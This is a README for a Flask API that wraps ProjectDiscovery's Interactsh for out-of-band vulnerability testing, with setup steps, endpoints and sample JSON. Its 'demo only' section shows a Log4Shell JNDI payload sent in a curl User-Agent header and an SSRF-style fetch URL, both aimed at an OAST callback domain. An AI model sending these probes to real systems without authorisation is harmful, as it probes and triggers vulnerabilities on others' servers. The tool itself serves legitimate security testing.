# Interactsh Wrapper API

This project provides a RESTful API wrapper around [ProjectDiscovery's Interactsh](https://github.com/projectdiscovery/interactsh), allowing you to programmatically:

- Get an OOB testing URL
- Monitor and retrieve interactions
- Simulate attacks (like Log4Shell)
- Run the service locally or via Docker

<br>

---

## 📌 Features

- REST API with Flask
- Exposes `getURL` and `getInteractions` API  
- Supports multiple users concurrently  
- Filters interactions by timestamp  
- Dockerized for quick deployment  


<br>

---

## 🗂️ Project Structure

```bash
interactsh-wrapper/
├── app/
│   ├── init.py                       # Makes app a package
│   ├── main.py                       # Flask app routes
│   └── interactsh_wrapper.py         # Core session + subprocess logic
├── run.py                            # Flask app entry point
├── Dockerfile                        # Docker image definition
├── requirements.txt                  # Python dependencies
└── README.md                         # Project documentation
```

<br>

---


## 🚀 Getting Started

### 🔧 Prerequisites

- Python 3.7+
- [interactsh-client](https://github.com/projectdiscovery/interactsh/releases)
- (Optional) Docker


<br>

---

## 🔌 Local Setup (Without Docker)

```bash
# 1. Clone the repo
git clone https://github.com/Nikunj-Goswami4/interactsh-wrapper.git
cd interactsh-wrapper

# 2. Install dependencies
pip install -r requirements.txt

# 3. Run the app
python -u run.py
```

<br>

## 🐳 Docker Setup

```bash
# 1. Build Docker Image
cd interactsh-wrapper
docker build -t interactsh-wrapper .

# 2. Run the Service
docker run -p 5000:5000 interactsh-wrapper
```

<br>

---

## 💻 Sample Workflow

**After setup is complete, here’s how you can use the service:**

### 1. 🔗 Get a Unique Interactsh OAST URL
- Endpoint: `/api/getURL`
- Returns a unique `.oast.*` domain for out-of-band testing (can be `.pro`, `.me`, `.fun`, etc.)
- Optional Query Param: `user=your_user_id`

```bash
# Using terminal
curl -X GET "http://localhost:5000/api/getURL?user=nikunj"

# Using browser
http://localhost:5000/api/getURL?user=nikunj
```
**Sample Response:**
```json
{
  "url": "c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro"
}
```
🌐 This domain can be used to detect vulnerabilities like Log4Shell, XXE, etc.

<br>
### 2. 🎯 Simulate an OOB Interaction (Manually)
You can’t generate real interactions unless a vulnerable service makes a callback to your URL.

**Example Payload (for demo only):**
```bash
# Using terminal
curl -H "User-Agent: \${jndi:ldap://c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro}" http://example.com

# Using browser
https://example.com/api/fetch?url=http://c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro
```
💬 This is how the payload gets sent to a vulnerable target. If the target is vulnerable, it will make a DNS or HTTP request to your Interactsh domain.

<br>
### 3. 📥 Fetch Interactions for a Given URL
- Endpoint: `/api/getInteractions`
- Returns all interactions (IP and timestamp) for a given Interactsh URL
- Optional params:
  `from` (start timestamp)
  `to` (end timestamp)
  Format: `YYYY-MM-DD HH:MM:SS`
  
```bash
# Using terminal
curl -X GET "http://localhost:5000/api/getInteractions?url=c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro"

# Using browser
http://localhost:5000/api/getInteractions?url=c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro
```
**If no interaction:**
```json
{
  "interactions": []
}
```
**If interactions are found:**
```json
{
  "interactions": [
    {
      "ip": "172.253.226.100",
      "timestamp": "2025-06-17 12:26:00"
    },
    {
      "ip": "43.22.22.50",
      "timestamp": "2025-06-17 12:26:20"
    }
  ]
}
```
🎯 These logs help confirm that a server interacted with your payload — a strong sign of a vulnerability.

<br>
### 4. ⏳ (Optional) Filter Interactions by Timestamp
Use `from` and `to` query params to narrow down results by time.
```bash
# Using terminal
curl -G "http://localhost:5000/api/getInteractions" \ --data-urlencode "url=c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro" \ --data-urlencode "from=2025-06-17 12:00:00" \ --data-urlencode "to=2025-06-17 13:00:00"

# Using browser
http://localhost:5000/api/getInteractions?url=c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro&from=2025-06-17%2012:00:00&to=2025-06-17%2013:00:00
```

**Filtered Result Example:**
```json
{
  "interactions": [
    {
      "ip": "43.22.22.50",
      "timestamp": "2025-06-17 12:26:20"
    }
  ]
}
```
⏱️ This is useful for debugging long-running sessions or testing specific time windows.


<br>
### 5. ❗ Error Handling — Missing URL Param
```bash
# Using terminal
curl -X GET "http://localhost:5000/api/getInteractions"

# Using browser
http://localhost:5000/api/getInteractions
```

**Expected Error Response:**
```json
{
  "error": "Missing 'url' param"
}
```

<br>
### 6. 👥 Bonus: Test Multiple Users Simultaneously
```bash
# Using terminal
curl -X GET "http://localhost:5000/api/getURL?user=testuser1" "http://localhost:5000/api/getURL?user=testuser2"

# Using browser
http://localhost:5000/api/getURL?user=testuser1
http://localhost:5000/api/getURL?user=testuser2
```

**Sample Output:**
```json
{
  "url": "xyzabc1abcd1234xyzabcd.oast.pro"
}
{
  "url": "dsdsdsfv4534534rgergbgdf.oast.me"
}
```
🔄 Demonstrates multi-user support:
- Each user gets a unique session
- Interactions are tracked per URL
- You can extend the logic to persist data in a database like Redis or PostgreSQL

<br>

---

## 📽️ Demo Videos

### 1. Using Terminal
demo_vid_terminal_interactsh_wrapper.mp4

<br>

### 2. Using Browser
demo_vid_browser_interactsh_wrapper.mp4
